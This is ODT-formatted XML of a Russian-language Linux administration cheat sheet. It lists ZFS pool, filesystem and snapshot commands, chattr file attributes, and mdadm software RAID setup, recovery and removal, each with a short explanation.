      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zpool</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">upgrade</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">v</text:span><text:span text:style-name="T1"> - увидеть версию, и фичи текущего </text:span><text:span text:style-name="T3">ZFS</text:span><text:span text:style-name="T1">, -</text:span><text:span text:style-name="T3">a</text:span><text:span text:style-name="T1"> обновит все пулы до новейшей версии</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Создание ФС и свойства ФС</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">create</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">data</text:span><text:span text:style-name="T1"> - создать ФС </text:span><text:span text:style-name="T3">data</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">create</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T1"> создать ФС </text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T1">, обе ФС будут бесконтрольно расти, пока не выставлены квоты</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">destroy</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">fr</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">old</text:span><text:span text:style-name="T1"> - уничтожит ФС </text:span><text:span text:style-name="T3">old</text:span><text:span text:style-name="T1">, ключ -</text:span><text:span text:style-name="T3">r</text:span><text:span text:style-name="T1"> - рекурсивно, если внутри ещё несколько ФС, -</text:span><text:span text:style-name="T3">f</text:span><text:span text:style-name="T1"> - форсить</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">set</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">reservation</text:span><text:span text:style-name="T1">=1</text:span><text:span text:style-name="T3">G</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">data</text:span><text:span text:style-name="T1"> - зарезервировать 1 Гигабайт, который ФС гарантированно получит, а другие не займут</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">list</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">o</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">quota</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T1"> - выяснить квоту в пуле на ФС </text:span><text:span text:style-name="T3">backups</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">set</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">quota</text:span><text:span text:style-name="T1">=1</text:span><text:span text:style-name="T3">G</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T1"> - установить квоту в 1 Гигабайт на ФС </text:span><text:span text:style-name="T3">backups</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">list</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">o</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">compression</text:span><text:span text:style-name="T1"> - проверить включена компрессия или нет</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs set compression=on zfspool/backups - включить компрессию на ФС backups в пуле zfspool</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs set sharesmb=on zfspool/backups - расшарить по SMB ФС backups средствами ZFS</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs set sharenfs=on zfspool/backups - расшарить по NFS ФС backups средствами ZFS</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Маунт</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">mount</text:span><text:span text:style-name="T1"> - отобразить все маунтированные ФС</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">zfs mount zfspool/backups - маунт ФС backups</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs umount zfspool/backups - анмаунт ФС backups</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs mount -a - маунт всех ФС ZFS</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs umount -a Umount - анмаунт всех ФС ZFS</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Снапшоты</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs list -t snapshot - отобразить все снапшоты</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">list</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">o</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">space</text:span><text:span text:style-name="T1"> - сколько занимают места снапшоты и конкретные дети пулов</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">snapshot</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T1">@</text:span><text:span text:style-name="T3">test</text:span><text:span text:style-name="T1"> - создать снапшот ФС </text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T1"> с названием </text:span><text:span text:style-name="T3">test</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">rollback</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T1">@</text:span><text:span text:style-name="T3">test</text:span><text:span text:style-name="T1"> - вернуться к снапшоту </text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T1"> с названием </text:span><text:span text:style-name="T3">test</text:span><text:span text:style-name="T1">, с ключом -</text:span><text:span text:style-name="T3">r</text:span><text:span text:style-name="T1"> рекурсивно уничтожит промежуточные снапшоты, с ключом -</text:span><text:span text:style-name="T3">f</text:span><text:span text:style-name="T1"> форсит анмаунт и ремаунт</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">destroy</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T1">@</text:span><text:span text:style-name="T3">test</text:span><text:span text:style-name="T1"> - уничтожить снапшот </text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T1"> с названием </text:span><text:span text:style-name="T3">test</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">send</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T1">@</text:span><text:span text:style-name="T3">march</text:span><text:span text:style-name="T1">2021 &gt; /</text:span><text:span text:style-name="T3">home</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">march</text:span><text:span text:style-name="T1">2021.</text:span><text:span text:style-name="T3">bak</text:span><text:span text:style-name="T1"> - сделать локальный бекап снапшота </text:span><text:span text:style-name="T3">march</text:span><text:span text:style-name="T1">2021</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">receive</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1">2/</text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T1">2 &lt; /</text:span><text:span text:style-name="T3">home</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">march</text:span><text:span text:style-name="T1">2021.</text:span><text:span text:style-name="T3">bak</text:span><text:span text:style-name="T1"> - Восстановить из локального снапшота ФС на другом пуле</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">send</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T1">@</text:span><text:span text:style-name="T3">march</text:span><text:span text:style-name="T1">2021 | </text:span><text:span text:style-name="T3">zfs</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">receive</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1">2/</text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T1">2 - Комбо предыдущих двух</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">send</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T1">@</text:span><text:span text:style-name="T3">march</text:span><text:span text:style-name="T1">2021 | </text:span><text:span text:style-name="T3">ssh</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">COMP</text:span><text:span text:style-name="T1">02 “</text:span><text:span text:style-name="T3">zfs</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">receive</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">testpool</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">testfs</text:span><text:span text:style-name="T1">” - Отправить снапшот по </text:span><text:span text:style-name="T3">SSH</text:span><text:span text:style-name="T1"> на хост </text:span><text:span text:style-name="T3">COMP</text:span><text:span text:style-name="T1">02</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">clone</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T1">@</text:span><text:span text:style-name="T3">march</text:span><text:span text:style-name="T1">2021 /</text:span><text:span text:style-name="T3">clones</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T1"> - Клонировать существующий снапшот</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">destroy</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T1">@</text:span><text:span text:style-name="T3">march</text:span><text:span text:style-name="T1">2021 - Уничтожить клон</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Атрибуты файлов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chattr</text:span><text:span text:style-name="T1"> +</text:span><text:span text:style-name="T3">a</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1"> - Разрешает только добавление данных в файл</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chattr</text:span><text:span text:style-name="T1"> +</text:span><text:span text:style-name="T3">d</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1"> - Игнорировать данный файл при создании резервной копии с помощью программы </text:span><text:span text:style-name="T3">dump</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chattr</text:span><text:span text:style-name="T1"> +</text:span><text:span text:style-name="T3">c</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1"> - Разрешить ядру автоматически сжимать/разжимать содержимое файла</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chattr</text:span><text:span text:style-name="T1"> +</text:span><text:span text:style-name="T3">i</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">1 - Защита файла от каких-либо изменений или манипуляций: редактирование, перемещение, удаление, создание ссылок на него</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chattr</text:span><text:span text:style-name="T1"> +</text:span><text:span text:style-name="T3">S</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">1 - Определяет, будет-ли при сохранении изменений, произведена синхронизация, как при использовании команды </text:span><text:span text:style-name="T3">sync</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chattr</text:span><text:span text:style-name="T1"> +</text:span><text:span text:style-name="T3">u</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">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1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chattr</text:span><text:span text:style-name="T1"> +</text:span><text:span text:style-name="T3">s</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">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5"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">lsattr</text:span><text:span text:style-name="T1"> - Листинг файлов с атрибутами</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">Шпаргалка по </text:span><text:span text:style-name="T3">RAID</text:span><text:span text:style-name="T1"> </text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm</text:span><text:span text:style-name="T1"> - утилита для работы с программными </text:span><text:span text:style-name="T3">RAID</text:span><text:span text:style-name="T1">-массивами различных уровней. В данной инструкции рассмотрим примеры ее использования.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Информация о </text:span><text:span text:style-name="T3">RAID</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">cat</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">proc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">mdstat</text:span><text:span text:style-name="T1"> - состояние всех </text:span><text:span text:style-name="T3">RAID</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">D</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">md</text:span><text:span text:style-name="T1">0 - подробная инфа о конкретном </text:span><text:span text:style-name="T3">RAID</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">lsblk</text:span><text:span text:style-name="T1"> - список дисков с разделами, местом, типом</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">df</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">hT</text:span><text:span text:style-name="T1"> - свободное место, тип файловой системы, точки монтирования</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Сборка </text:span><text:span text:style-name="T3">RAID</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm</text:span><text:span text:style-name="T1"> --</text:span><text:span text:style-name="T3">zero</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">superblock</text:span><text:span text:style-name="T1"> --</text:span><text:span text:style-name="T3">force</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">sd</text:span><text:span text:style-name="T1">{</text:span><text:span text:style-name="T3">b</text:span><text:span text:style-name="T1">,</text:span><text:span text:style-name="T3">c</text:span><text:span text:style-name="T1">} - обнуление суперблоков на дисках </text:span><text:span text:style-name="T3">sdb</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">sdc</text:span><text:span text:style-name="T1"> (для удаления инфы о других </text:span><text:span text:style-name="T3">RAID</text:span><text:span text:style-name="T1">) при получении ответа </text:span><text:span text:style-name="T3">mdadm</text:span><text:span text:style-name="T1">: </text:span><text:span text:style-name="T3">Unrecognised</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">md</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">component</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">device</text:span><text:span text:style-name="T1"> - /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">sdb</text:span><text:span text:style-name="T1"> значит, что диск не использовался для </text:span><text:span text:style-name="T3">RAID</text:span><text:span text:style-name="T1">, продолжаем</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm --create --verbose /dev/md0 -l 1 -n 2 /dev/sd{b,c}</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T1">* где /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">md</text:span><text:span text:style-name="T1">0 - устройство </text:span><text:span text:style-name="T3">RAID</text:span><text:span text:style-name="T1">, которое появится после сборки; -</text:span><text:span text:style-name="T3">l</text:span><text:span text:style-name="T1"> 1 - уровень </text:span><text:span text:style-name="T3">RAID</text:span><text:span text:style-name="T1">; -</text:span><text:span text:style-name="T3">n</text:span><text:span text:style-name="T1"> 2 - количество дисков, из которых собирается массив; /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">sd</text:span><text:span text:style-name="T1">{</text:span><text:span text:style-name="T3">b</text:span><text:span text:style-name="T1">,</text:span><text:span text:style-name="T3">c</text:span><text:span text:style-name="T1">} - сборка выполняется из дисков </text:span><text:span text:style-name="T3">sdb</text:span><text:span text:style-name="T1"> и </text:span><text:span text:style-name="T3">sdc</text:span><text:span text:style-name="T1">.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Создание файловой системы и монтирование массива</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mkfs</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">ext</text:span><text:span text:style-name="T1">4 /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">md</text:span><text:span text:style-name="T1">0 - создание файловой системы </text:span><text:span text:style-name="T3">ext</text:span><text:span text:style-name="T1">4 на </text:span><text:span text:style-name="T3">md</text:span><text:span text:style-name="T1">0</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mount</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">md</text:span><text:span text:style-name="T1">0 /</text:span><text:span text:style-name="T3">mnt</text:span><text:span text:style-name="T1"> - разово примонтировать </text:span><text:span text:style-name="T3">md</text:span><text:span text:style-name="T1">0 к /</text:span><text:span text:style-name="T3">mnt</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">nano</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">fstab</text:span><text:span text:style-name="T1">, прописать /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">md</text:span><text:span text:style-name="T1">0 /</text:span><text:span text:style-name="T3">mnt</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">ext</text:span><text:span text:style-name="T1">4 </text:span><text:span text:style-name="T3">defaults</text:span><text:span text:style-name="T1"> 1 2 - постоянное монтирование, работает после перезагрузки</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Восстановление </text:span><text:span text:style-name="T3">RAID</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Замена жесткого диска</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">При выходе из строя, команда </text:span><text:span text:style-name="T3">mdadm</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">D</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">md</text:span><text:span text:style-name="T1">0 выдаст: </text:span><text:span text:style-name="T3">State</text:span><text:span text:style-name="T1"> : </text:span><text:span text:style-name="T3">clean</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">degraded</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">md</text:span><text:span text:style-name="T1">0 --</text:span><text:span text:style-name="T3">remove</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">sdc</text:span><text:span text:style-name="T1"> - удалить сбойный диск</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">md</text:span><text:span text:style-name="T1">0 --</text:span><text:span text:style-name="T3">add</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">sde</text:span><text:span text:style-name="T1"> - добавить новый диск в массив</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Статус должен стать </text:span><text:span text:style-name="T3">Rebuild</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Status</text:span><text:span text:style-name="T1"> : 40% </text:span><text:span text:style-name="T3">complete</text:span><text:span text:style-name="T1"> и так до полного восстановления</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Пересборка массива</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Если нам нужно вернуть ранее разобранный или развалившийся массив из дисков, которые уже входили в состав </text:span><text:span text:style-name="T3">RAID</text:span><text:span text:style-name="T1">, вводим:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm</text:span><text:span text:style-name="T1"> --</text:span><text:span text:style-name="T3">assemble</text:span><text:span text:style-name="T1"> --</text:span><text:span text:style-name="T3">scan</text:span><text:span text:style-name="T1"> - команда сама найдет необходимую конфигурацию и восстановит </text:span><text:span text:style-name="T3">RAID</text:span><text:span text:style-name="T1">.</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm</text:span><text:span text:style-name="T1"> --</text:span><text:span text:style-name="T3">assemble</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">md</text:span><text:span text:style-name="T1">0 /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">sdb</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">sdc</text:span><text:span text:style-name="T1"> - с указанием из каких дисков пересобрать</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Запасной диск (</text:span><text:span text:style-name="T3">Hot</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Spare</text:span><text:span text:style-name="T1">)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Если в массиве будет запасной диск для горячей замены, при выходе из строя одного из основных дисков, его место займет запасной.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">md</text:span><text:span text:style-name="T1">0 --</text:span><text:span text:style-name="T3">add</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">sdd</text:span><text:span text:style-name="T1"> - Диском </text:span><text:span text:style-name="T3">Hot</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Spare</text:span><text:span text:style-name="T1"> станет тот, который просто будет добавлен к массиву</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Добавить диск к массиву, расширить массив</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">Добавление активного диска к </text:span><text:span text:style-name="T3">RAID</text:span><text:span text:style-name="T1">, который будет использоваться для работы, а не в качестве запасного.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm /dev/md0 --add /dev/sde</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm -G /dev/md0 --raid-devices=3 - расширяем RAID</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* в данном примере подразумевается, что у нас </text:span><text:span text:style-name="T3">RAID</text:span><text:span text:style-name="T1"> 1 и мы добавили к нему 3-й диск.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Установка </text:span><text:span text:style-name="T3">mdadm</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Если каким-то образом в дистрибутиве нет этого пакета</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">apt-get install mdadm</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Удаление массива</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Если нам нужно полностью разобрать </text:span><text:span text:style-name="T3">RAID</text:span><text:span text:style-name="T1">, сначала размонтируем и остановим его:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">umount</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">mnt</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* где /</text:span><text:span text:style-name="T3">mnt</text:span><text:span text:style-name="T1"> - каталог монтирования нашего </text:span><text:span text:style-name="T3">RAID</text:span><text:span text:style-name="T1">.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">S</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">md</text:span><text:span text:style-name="T1">0</text:span></text:p>
